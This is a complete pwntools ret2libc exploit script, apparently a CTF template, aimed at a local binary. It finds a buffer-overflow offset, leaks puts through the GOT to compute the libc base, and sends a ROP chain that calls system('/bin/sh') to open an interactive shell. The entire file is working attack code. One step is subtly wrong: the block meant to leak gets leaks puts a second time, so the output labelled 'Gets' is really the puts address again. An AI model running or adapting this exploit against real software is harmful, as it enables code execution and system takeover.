from pwn import *
#context.log_level = 'debug'
elf = ELF("./tests/ret")
rop = ROP(elf)
offset_leaking = elf.process()
p = elf.process()
context.arch = 'amd64'

### FIND OFFSET 
OFFSET = b""
if OFFSET == b"":
	log.info("Searching for offset")
	offset_leaking.sendline(cyclic(516,n=8))
	offset_leaking.wait()
	core = Coredump('./core')
	OFFSET = cyclic_find(core.read(core.rsp,8),n=8)
	log.info(f"Offset is {OFFSET}")

### LEAK PUTS AND GETS
p.recv()
try: 
	rop.call(elf.symbols["puts"], [elf.got['puts']])
except:
	log.warning("No gets in GOT")
try: 
	rop.call(elf.symbols["puts"], [elf.got['puts']])
except:
	log.warning("No puts in GOT")
try: 
	rop.call(elf.symbols["main"])
except:
	log.warning("Did not found main... exiting")
	exit()

payload1 = [
	b"A"*OFFSET,
	rop.chain()
]

payload1 = b"".join(payload1)

p.sendline(payload1)

puts = u64(p.recvuntil(b"\n").rstrip().ljust(8, b"\x00"))
log.info(f"Puts @ {hex(puts)}")
gets = u64(p.recvuntil(b"\n").rstrip().ljust(8, b"\x00"))
log.info(f"Gets @ {hex(gets)}")
### CHECK IF YOU FOUND LIBC
LIBC = "./libc/libc6_2.31-0ubuntu9.2_amd64.so"
if LIBC:
	libc = ELF(LIBC)
	libcbase = puts - libc.symbols['puts']
	log.info(f"base libc {hex(libcbase)}")
else:
	log.warning("No LIBC set. Please go to https://libc.blukat.me/")
	exit()

### SPAWN /bin/sh
roplibc = ROP(libc)

POP_RDI = (roplibc.find_gadget(['pop rdi', 'ret']))[0]
BINSH = next(libc.search(b"/bin/sh"))
SYSTEM = libc.sym["system"]
EXIT = libc.sym["exit"]

log.info(f"POP_RDI @ {hex(POP_RDI+libcbase)}")
log.info(f"/bin/sh @ {hex(BINSH+libcbase)}")
log.info(f"system @ {hex(SYSTEM+libcbase)}")
log.info(f"exit @ {hex(EXIT+libcbase)}")

payload2 = b"A"*OFFSET + p64(POP_RDI+libcbase) + p64(BINSH+libcbase) + p64(SYSTEM+libcbase) + p64(EXIT+libcbase)

p.sendline(payload2)
p.interactive()
